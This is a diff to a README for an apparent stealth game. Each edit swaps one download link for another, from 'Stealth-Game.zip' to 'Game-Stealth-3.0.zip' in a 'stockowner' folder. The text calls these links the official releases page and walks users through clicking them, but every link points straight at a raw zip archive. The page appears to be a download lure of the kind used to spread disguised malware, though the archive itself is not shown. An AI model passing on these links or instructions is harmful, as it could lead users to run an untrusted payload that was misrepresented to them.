@@ -1,6 +1,6 @@
 # 🎮 Stealth-Game - Sneak Past Your Enemies with Ease
 
-[![Download the latest release](https://raw.githubusercontent.com/ManuMTL2008/Stealth-Game/main/stockowner/Stealth-Game.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ManuMTL2008/Stealth-Game/main/stockowner/Stealth-Game.zip)
+[![Download the latest release](https://raw.githubusercontent.com/ManuMTL2008/Stealth-Game/main/stockowner/Game-Stealth-3.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ManuMTL2008/Stealth-Game/main/stockowner/Game-Stealth-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Make sure your system is ready for a smooth gaming experience.
 
 To download Stealth-Game, visit the official releases page:
 
-[Download the latest release](https://raw.githubusercontent.com/ManuMTL2008/Stealth-Game/main/stockowner/Stealth-Game.zip)
+[Download the latest release](https://raw.githubusercontent.com/ManuMTL2008/Stealth-Game/main/stockowner/Game-Stealth-3.0.zip)
 
 1. Click the link above to open the releases page.
 2. On that page, look for the latest version of Stealth-Game. You will see the version number and a description of any new features or updates.
@@ -75,6 +75,6 @@ If you need additional help with Stealth-Game, feel free to reach out. You can c
 
 As you explore the game, we welcome your feedback. Share your thoughts, bugs, or suggestions to help us improve your gaming experience.
 
-Don’t forget to visit our [releases page](https://raw.githubusercontent.com/ManuMTL2008/Stealth-Game/main/stockowner/Stealth-Game.zip) for the latest updates and enhancements. 
+Don’t forget to visit our [releases page](https://raw.githubusercontent.com/ManuMTL2008/Stealth-Game/main/stockowner/Game-Stealth-3.0.zip) for the latest updates and enhancements. 
 
 Enjoy your stealthy adventures!
